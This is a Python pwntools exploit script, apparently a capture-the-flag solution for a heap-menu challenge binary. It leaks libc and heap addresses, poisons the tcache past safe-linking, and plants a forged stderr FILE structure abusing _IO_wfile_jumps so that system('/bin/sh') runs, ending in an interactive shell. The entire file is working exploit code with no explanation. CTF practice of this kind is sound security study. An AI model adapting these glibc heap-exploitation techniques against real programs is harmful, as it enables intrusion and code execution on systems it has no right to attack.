#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 36301
HOST = "127.0.0.1"
exe = context.binary = ELF('./chall_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            brva 0x00000000000014F9
            brva 0x000000000000159C
            brva 0x000000000000172D
            b* __malloc_assert
            b* _IO_wfile_overflow
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def add(idx, size, data = b'abcd'):
    p.sendlineafter(b'> ', str(1))
    p.sendlineafter(b'book: ', str(idx))
    p.sendlineafter(b'book: ', str(size))
    p.sendafter(b'book: ', data)

def free(idx):
    p.sendlineafter(b'> ', str(2))
    p.sendlineafter(b'book: ', str(idx))

def show(idx):
    p.sendlineafter(b'> ', str(3))
    p.sendlineafter(b'book: ', str(idx))

# VARIABLE

# PAYLOAD
add(0, 0x500)
for i in range(3):
    add(i + 1, 0x30)
free(0)
add(0, 0x508, b'a')
show(0)
p.recvuntil(b'Content: ')
libc_leak = u64(p.recv(6) + b'\0'*2)
libc.address = libc_leak - 0x21ac61
log.info("Libc base: " + hex(libc.address))
stderr = libc.sym._IO_2_1_stderr_
io_wfile_jumps = libc.sym._IO_wfile_jumps
system = libc.sym.system

free(1)
free(2)
add(1, 0x38, b'a')
show(1)
p.recvuntil(b'Content: ')
leak = u64(p.recv(6) + b'\0'*2)
log.info("Leak: " + hex(leak))

add(2, 0x38, b'\xf0')
show(2)
p.recvuntil(b'Content: ')
base_leak = u64(p.recv(5) + b'\0'*3)
log.info("Base leak: " + hex(base_leak))
heap_base = leak ^ base_leak
heap_base = heap_base >> 12
heap_base = heap_base << 12
log.info("Heap base: " + hex(heap_base))
fake_io_addr = heap_base + 0x870

add(1, 0x420)
add(2, 0x420)
add(3, 0x100)
add(4, 0x100)
add(5, 0x100)
free(2)
free(1)
payload = flat(
    b'\0'*0x428, 0x111
    )
add(1, 0x500, payload)
free(3)
free(2)
free(1)
target = stderr ^ ((heap_base + 0xca0) >> 12)
payload = flat(
    b'\0'*0x428, 0x111,
    target
    )
add(1, 0x500, payload)
add(3, 0x100)
payload = b'  /bin/sh\0' # flag
payload = payload.ljust(0x88, b'\0') + p64(heap_base) # _lock
payload = payload.ljust(0xa0, b'\0') + p64(fake_io_addr) # _wide_data
payload = payload.ljust(0xc0, b'\0') + p64(0) # _mode
payload = payload.ljust(0xd8, b'\0') + p64(io_wfile_jumps - 0x48 + 0x28) # vtable
add(4, 0x100, payload)

free(1)
free(5)
free(3)
target = (heap_base + 0x13f0) ^ ((heap_base + 0xca0) >> 12)
payload = b''
payload = payload.ljust(0x18, b'\0') + p64(0) # _IO_write_base
payload = payload.ljust(0x30, b'\0')
payload += p64(0) # _IO_buf_base
payload = payload.ljust(0xe0, b'\0')
payload += p64(fake_io_addr + 0x100) # _wide_vtable
payload = payload.ljust(0x100, b'\0')
payload = payload.ljust(0x168, b'\0') + p64(system) # __doallocate
payload = payload.ljust(0x428, b'\0') + p64(0x110) + p64(target)
add(1, 0x500, payload)
add(6, 0x100)
add(7, 0x100, b'\0'*8 + p64(0x120))

p.sendlineafter(b'> ', str(1))
p.sendlineafter(b'book: ', str(8))
p.sendlineafter(b'book: ', str(0x350))

p.interactive()